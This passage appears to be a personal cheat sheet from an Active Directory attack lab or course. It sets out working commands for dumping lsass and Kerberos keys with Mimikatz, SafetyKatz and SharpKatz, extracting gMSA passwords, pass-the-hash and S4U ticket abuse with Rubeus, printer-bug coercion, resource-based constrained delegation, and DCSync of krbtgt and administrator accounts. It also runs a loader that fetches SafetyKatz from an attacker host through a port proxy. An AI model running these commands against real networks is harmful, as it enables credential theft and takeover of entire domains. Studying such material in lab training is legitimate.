      <p><strong>PowerShell Remoting and Invoke-Mimi</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"&lt;computer&gt;\administrator"</span><span class="p">,</span><span class="w"> </span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span><span class="nv">$mailmgmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$mailmgmt</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Bypass AMSI before proceeding</strong>!</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$mailmgmt</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$mailmgmt</span><span class="w">
</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"sekurlsa::keys"'</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>gMSA</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="nx">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">jumpone</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">PrincipalsAllowedToRetrieveManagedPassword</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>You have to open a shell with the user that has permission to read gMSA, after that</p>
      </blockquote>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">Module</span><span class="w"> </span><span class="nx">again</span><span class="p">,</span><span class="w"> </span><span class="nx">then:</span><span class="w">
</span><span class="nv">$Passwordblob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">jumpone</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">msDS-ManagedPassword</span><span class="p">)</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="w">
</span><span class="n">To</span><span class="w"> </span><span class="nx">decode</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">DSinternals:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1</span><span class="w">
</span><span class="nv">$decodedpwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="nv">$Passwordblob</span><span class="w">
</span><span class="n">ConvertTo-NTHash</span><span class="w"> </span><span class="err">–</span><span class="nx">Password</span><span class="w"> </span><span class="nv">$decodedpwd</span><span class="o">.</span><span class="nf">SecureCurrentPassword</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>After that, you can PTH to see if the user has access to another machine!</p>
      </blockquote>

    </div>
  </details>

  <details>
    <summary>PTH</summary>
    <div class="content">

      <p><strong>From an elevated shell</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;password&gt; /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>using NTLM</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:&lt;user&gt; /domain:&lt;domain&gt;  /ntlm:&lt;password&gt; /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">

</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/msdsspn:CIFS/</span><span class="err">&lt;</span><span class="nx">machine.domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/altservice:HTTP</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Doesn’t need elevation</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Application Whitelisting</summary>
    <div class="content">

      <blockquote>
        <p>CLM, AppLocker, WDAC</p>
      </blockquote>

      <p><strong>Verify if PowerShell is running in Constrained Language Mode</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check for AppLocker</strong> (if there is an error, the AppLocker is not in use):</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\Software\Policies\Microsoft\Windows\SRPV2</span><span class="w">
</span><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="err">–</span><span class="nx">Effective</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Verify WDAC</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">Win32_DeviceGuard</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="nx">root\Microsoft\Windows\DeviceGuard</span><span class="w">
</span><span class="n">CodeIntegrityPolicyEnforcementStatus</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">UsermodeCodeIntegrityPolicyEnforcementStatus</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span></code></pre></div>      </div>

      <p>Check out <a href="https://lolbas-project.github.io/">Lolbas Project on Github</a></p>

      <blockquote>
        <p>Lets DUMP lsass*</p>
      </blockquote>

      <p><strong>Get the PID of lsass.exe process</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tasklist</span><span class="w"> </span><span class="nx">/FI</span><span class="w"> </span><span class="s2">"IMAGENAME eq lsass.exe"</span><span class="w">
</span><span class="n">rundll32.exe</span><span class="w"> </span><span class="nx">C:\windows\System32\comsvcs.dll</span><span class="p">,</span><span class="w"> </span><span class="nx">MiniDump</span><span class="w"> </span><span class="nx">708</span><span class="w"> </span><span class="nx">C:\Users\Public\lsass.dmp</span><span class="w"> </span><span class="nx">full</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy the <code class="language-plaintext highlighter-rouge">lsass</code> to your machine</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">\\us-jump\C</span><span class="err">$</span><span class="nx">\Users\Public\lsass.dmp</span><span class="w"> </span><span class="nx">C:\AD\Tools\lsass.dmp</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Run Mimikatz with Admin Priv, then</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sekurlsa::minidump</span><span class="w"> </span><span class="nx">C:\AD\Tools\lsass.DMP</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">sekurlsa::keys</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check for Certificates</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\us-jump\C</span><span class="err">$</span><span class="nx">\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\us-jump\C</span><span class="err">$</span><span class="nx">\Users\Public\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-jump</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="nx">ls</span><span class="w"> </span><span class="nx">cert:\LocalMachine\My</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nx">cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-PfxCertificate</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\Users\Public\user.pfx</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-String</span><span class="w"> </span><span class="s1">'SecretPass@123'</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="p">)</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy the certificate</strong>:</p>
      <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo F | xcopy \\us-jump\C$\Users\Public\user.pfx C:\AD\Tools\user.pfx
</code></pre></div>      </div>

    </div>
  </details>
  
  <details>
    <summary>Unconstrained delegation</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">TrustedForDelegation</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Access the machine with unconstrained deleg, then</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\AD\Tools\</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
</span><span class="nx">Find-PSRemotingLocalAdminAccess</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy Rubeus using xcopy and execute using winrs</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">\\us-web\C</span><span class="err">$</span><span class="nx">\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-web</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
</span><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/targetuser:DC</span><span class="err">$</span><span class="w"> </span><span class="nx">/interval:5</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy and execute Rubeus using PowerShell Remoting</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$usweb1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nx">us-web</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-ToSession</span><span class="w"> </span><span class="nv">$usweb1</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$usweb1</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/targetuser:DC</span><span class="err">$</span><span class="w"> </span><span class="nx">/interval:5</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Abuse the printer bug</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\MS-RPRN.exe</span><span class="w"> </span><span class="nx">\\dc.domain.local</span><span class="w"> </span><span class="nx">\\us-web.domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy the Base64EncodedTicket, then</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:TGTofDC</span><span class="err">$</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Run DCSync attack</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\krbtgt</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>To get EA access</strong></p>

      <p>it’s the same:</p>

      <ol>
        <li>Monitor the DC of the root of the forest</li>
        <li>Execute MS-RPRN with the DC target</li>
        <li>Copy the Base64 and PTT</li>
        <li>DCSync EA (Administrator of the root forest)</li>
      </ol>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\administrator</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">domain-dc.domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>In a different forest</strong></p>

      <blockquote>
        <p>If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well.</p>
      </blockquote>

      <ol>
        <li>ASKTGT</li>
        <li>Send Rubeus to the target machine</li>
        <li>Access the machine with WINRS</li>
        <li>Execute Rubeus monitor (with the Target Forest)</li>
        <li>Execute MS-RPRN (with the Target Forest)</li>
        <li>Copy base64 &amp; PTT with Rubeus</li>
      </ol>

      <p><strong>Now we can run DCSync to the Targeted Forest</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">usvendor\krbtgt</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">usvendor.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">usvendor-dc.usvendor.local</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Constrained delegation</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Collect the service from msDS-AllowedToDelegateTo and access with Rubeus S4U</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">klist</span><span class="w">
</span><span class="nx">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-mssql.domain.local</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>To execute on another Forest just add the flag -Server</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>We need access to the machine that has Constrained Deleg enabled</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="nx">/password:Qwerty</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w">
</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/rc4:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/msdsspn:nmagent/dc.domain.local</span><span class="w"> </span><span class="nx">/altservice:ldap</span><span class="w"> </span><span class="nx">/dc:dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>With the LDAP service ticket, We can DCSync</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\krbtgt</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
</span><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\administrator</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>ACLs Write Permissions</summary>
    <div class="content">

      <p><strong>If you have Write permission</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\us-mgmt\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-mgmt</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">x</span><span class="w">
</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span><span class="n">sekurlsa::keys</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>If you get any user, run the full enumeration on that user</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">
</span><span class="nx">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'mgmtadmin'</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>With GenericWrite we can set Resource-based Constrained Delegation (RBCD)</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="nx">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span><span class="nv">$comps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'user1$'</span><span class="p">,</span><span class="s1">'user2$'</span><span class="w">
</span><span class="n">Set-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">us-helpdesk</span><span class="w"> </span><span class="nt">-PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nv">$comps</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Extract AES of your machine</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"sekurlsa::keys"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Go for the one with SID S-1-5-18 that is a well-known SID for the SYSTEM user</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:machine</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:</span><span class="nv">$password</span><span class="w"> </span><span class="nx">/msdsspn:http/us-helpdesk</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span><span class="nx">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-helpdesk</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>To copy our loader to the machine, we need to access the filesystem. So, request a TGS for CIFS using Rubeus</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:machine</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:</span><span class="nv">$password</span><span class="w"> </span><span class="nx">/msdsspn:cifs/us-helpdesk</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\us-helpdesk\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-helpdesk</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">x</span><span class="w">
